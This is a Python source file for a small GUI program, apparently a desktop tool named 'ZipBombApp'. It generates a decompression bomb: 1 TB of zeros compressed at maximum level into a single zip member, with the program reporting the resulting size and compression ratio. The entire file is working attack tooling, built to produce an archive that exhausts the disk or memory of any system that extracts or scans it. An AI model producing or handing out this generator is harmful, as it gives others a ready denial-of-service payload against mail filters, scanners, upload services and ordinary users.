import io
import os
import threading
import tkinter as tk
from tkinter import filedialog, messagebox, ttk
import zipfile


class ZeroStream(io.RawIOBase):

  def __init__(self, size_in_bytes):
    self.remaining = size_in_bytes

  def readinto(self, b):
    if self.remaining <= 0:
      return 0
    chunk_size = min(len(b), self.remaining)
    b[:chunk_size] = b'\x00' * chunk_size
    self.remaining -= chunk_size
    return chunk_size

  def readable(self):
    return True


class ZipBombApp:

  def __init__(self, root):
    self.root = root
    self.root.title("1 TB Zip Generator")
    self.root.geometry("460x280")
    self.root.resizable(False, False)

    # Style configuration
    style = ttk.Style()
    style.theme_use("clam")

    # Destination Folder Selection
    ttk.Label(root, text="Select Output Folder:").pack(
        anchor="w", padx=20, pady=(20, 5)
    )

    folder_frame = ttk.Frame(root)
    folder_frame.pack(fill="x", padx=20)

    self.folder_path = tk.StringVar(value=os.getcwd())
    ttk.Entry(folder_frame, textvariable=self.folder_path).pack(
        side="left", fill="x", expand=True, padx=(0, 5)
    )
    ttk.Button(folder_frame, text="Browse...", command=self.browse_folder).pack(
        side="right"
    )

    # File Name Input
    ttk.Label(root, text="Zip File Name:").pack(
        anchor="w", padx=20, pady=(15, 5)
    )
    self.file_name = tk.StringVar(value="zip_bomb_1tb.zip")
    ttk.Entry(root, textvariable=self.file_name).pack(fill="x", padx=20)

    # Progress Indicator
    self.progress = ttk.Progressbar(root, mode="indeterminate")
    self.progress.pack(fill="x", padx=20, pady=20)

    # Action Button
    self.btn_generate = ttk.Button(
        root, text="Generate 1 TB Zip", command=self.start_generation
    )
    self.btn_generate.pack(pady=5)

  def browse_folder(self):
    selected_dir = filedialog.askdirectory()
    if selected_dir:
      self.folder_path.set(selected_dir)

  def start_generation(self):
    destination = self.folder_path.get()
    filename = self.file_name.get().strip()

    if not destination or not os.path.exists(destination):
      messagebox.showerror("Error", "Invalid destination folder!")
      return

    if not filename:
      messagebox.showerror("Error", "File name cannot be empty!")
      return

    if not filename.endswith(".zip"):
      filename += ".zip"

    output_path = os.path.join(destination, filename)

    # UI updates before processing
    self.btn_generate.config(state="disabled")
    self.progress.start(10)

    # Execute long-running process in a separate thread to prevent freezing
    threading.Thread(
        target=self.generate_zip, args=(output_path,), daemon=True
    ).start()

  def generate_zip(self, output_path):
    one_tb = 1024 * 1024 * 1024 * 1024
    chunk_size = 8 * 1024 * 1024  # 8 MB buffer chunks

    try:
      with zipfile.ZipFile(
          output_path,
          "w",
          compression=zipfile.ZIP_DEFLATED,
          compresslevel=9,
          allowZip64=True,
      ) as z:
        stream = io.BufferedReader(ZeroStream(one_tb))
        with z.open("bomb_1tb.bin", "w") as dest:
          while True:
            chunk = stream.read(chunk_size)
            if not chunk:
              break
            dest.write(chunk)

      archive_size = os.path.getsize(output_path)
      size_mb = archive_size / (1024 * 1024)
      ratio = int(one_tb / archive_size) if archive_size > 0 else 0

      # Success UI update
      self.root.after(
          0, self.on_success, output_path, size_mb, archive_size, ratio
      )

    except Exception as e:
      self.root.after(0, self.on_error, str(e))

  def on_success(self, output_path, size_mb, archive_size, ratio):
    self.progress.stop()
    self.btn_generate.config(state="normal")
    msg = (
        f"Zip file created successfully!\n\n"
        f"Path: {output_path}\n"
        f"Archive Size: {size_mb:.2f} MB ({archive_size:,} bytes)\n"
        f"Uncompressed Data: 1,024 GB (1 TB)\n"
        f"Compression Ratio: ~{ratio}:1"
    )
    messagebox.showinfo("Success", msg)

  def on_error(self, err_msg):
    self.progress.stop()
    self.btn_generate.config(state="normal")
    messagebox.showerror("Process Failed", f"An error occurred:\n{err_msg}")


if __name__ == "__main__":
  root = tk.Tk()
  app = ZipBombApp(root)
  root.mainloop()
